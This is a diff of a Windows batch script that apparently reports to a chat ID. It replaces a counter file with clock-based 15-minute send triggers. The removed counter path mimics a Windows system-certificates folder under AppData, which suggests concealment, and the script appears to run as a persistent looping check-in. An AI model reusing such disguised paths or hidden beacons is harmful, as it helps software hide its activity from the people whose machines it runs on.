@@ -31,21 +31,8 @@ if %instances% geq 2 (
 
 
 
-
-:: Counter file to track iterations
-set "counterFile=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\counter.txt"
 set "CheckSend=0"
-
-
-:: Initialize counter if the file doesn't exist
-if not exist "%counterFile%" (
-    echo 0 > "%counterFile%"
-)
-
-:: Read and update the counter
-for /f "delims=" %%A in (%counterFile%) do set "counter=%%A"
-set /a counter+=1
-echo !counter! > "%counterFile%"
+set "lastMinute=none"
 
 
 
@@ -476,13 +463,21 @@ echo Message sent to chat ID %CHAT_ID%
 
 
 
+set "currentMinute=%time:~3,2%"
 
-:: Check if the counter reaches 15 (since the batch runs every minute)
-if !counter! geq 15 (
-    set "CheckSend=1"
-    echo 0 > "%counterFile%"
+if "%currentMinute%" neq "%lastMinute%" (
+    if "%currentMinute%"=="00" set "CheckSend=1"
+    if "%currentMinute%"=="15" set "CheckSend=1"
+    if "%currentMinute%"=="30" set "CheckSend=1"
+    if "%currentMinute%"=="45" set "CheckSend=1"
+
 )
-
+echo.
+echo.
+echo.
+echo CheckSend=%CheckSend%
+echo Minutes=%currentMinute%
+timeout /t 3 /nobreak
 
 
 
@@ -493,6 +488,7 @@ if !counter! geq 15 (
 :: Check the value of CheckSend
 if "%CheckSend%"=="1" (
     set "CheckSend=0"
+	set "lastMinute=%currentMinute%"
     goto SENDCHECK
 ) else (
     goto checkloooop
@@ -570,7 +566,6 @@ cls
 ::echo Looping... (%currentSeconds%)
 ::timeout /t 1 /nobreak
 goto :loop_start
-
 
 
 
